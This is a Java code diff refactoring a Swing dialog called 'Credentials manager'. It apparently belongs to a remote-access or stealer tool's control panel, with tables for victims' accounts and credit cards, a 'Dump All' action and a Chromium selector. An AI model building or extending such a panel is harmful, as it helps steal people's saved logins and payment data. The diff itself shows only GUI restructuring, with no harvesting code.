@@ -3,29 +3,26 @@ package TableUtils.Credentials;
 import Server.Client;
 import Main.Main;
 import TableUtils.Credentials.Actions.DumpAllAction;
-import Utilities.GUIManagerInterface;
+import Utilities.AbstractDialogCreator;
 
 import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 
-public class CredentialsManagerGUI implements GUIManagerInterface {
-    private final JDialog credentialsManagerDialog;
+public class CredentialsManagerGUI extends AbstractDialogCreator {
     private DefaultTableModel accountsTableModel;
 
     private DefaultTableModel creditCardsTableModel;
     private JButton dumpAllJButton;
 
-    private final Client client;
 
     public CredentialsManagerGUI(Client client) {
-        this.client = client;
-        credentialsManagerDialog = new JDialog(Main.gui.getMainGUI(), "Credentials manager - " + client.getIdentifier());
-        credentialsManagerDialog.setLayout(new GridBagLayout());
-        credentialsManagerDialog.setSize(750, 300);
-        credentialsManagerDialog.setLocationRelativeTo(null);
+        super(Main.gui, client, "Credentials Manager");
+        this.setLayout(new GridBagLayout());
+        this.setSize(750, 300);
+        this.setLocationRelativeTo(null);
         addComponents();
-        credentialsManagerDialog.setVisible(true);
+        this.setVisible(true);
     }
 
     private void addComponents() {
@@ -54,7 +51,7 @@ public class CredentialsManagerGUI implements GUIManagerInterface {
         constraints.weighty = 1.0;
         constraints.fill = GridBagConstraints.BOTH;
 
-        credentialsManagerDialog.add(tabbedPane, constraints);
+        this.add(tabbedPane, constraints);
 
         // Configuración de los botones, como antes
         // ...
@@ -66,13 +63,13 @@ public class CredentialsManagerGUI implements GUIManagerInterface {
 
         constraints.gridx = 0;
         dumpAllJButton.addActionListener(new DumpAllAction(this));
-        credentialsManagerDialog.add(dumpAllJButton, constraints);
+        this.add(dumpAllJButton, constraints);
 
         JComboBox<String> myComboBox = new JComboBox<>();
         myComboBox.addItem("Chromium");
 
         constraints.gridx = 3;
-        credentialsManagerDialog.add(myComboBox, constraints);
+        this.add(myComboBox, constraints);
     }
 
     public DefaultTableModel getAccountsTableModel() {
@@ -84,17 +81,10 @@ public class CredentialsManagerGUI implements GUIManagerInterface {
     }
 
 
-    public JDialog getCredentialsManagerDialog() {
-        return credentialsManagerDialog;
-    }
-
     public DefaultTableModel getCreditCardsTableModel() {
         return creditCardsTableModel;
     }
 
-    @Override
-    public Client getClient() {
-        return client;
-    }
+
 }
 
